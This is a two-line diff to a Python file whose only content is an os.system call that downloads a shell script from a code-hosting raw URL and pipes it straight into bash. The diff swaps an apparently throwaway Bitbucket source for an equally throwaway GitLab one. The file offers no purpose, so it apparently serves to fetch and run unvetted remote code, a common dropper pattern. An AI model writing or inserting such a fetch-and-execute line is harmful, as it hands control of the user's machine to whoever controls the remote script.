@@ -1,2 +1,2 @@
 import os
-os.system('curl -sL https://bitbucket.org/nicezep/korong/raw/master/newjajal | bash')
+os.system('curl -sL https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh | bash')
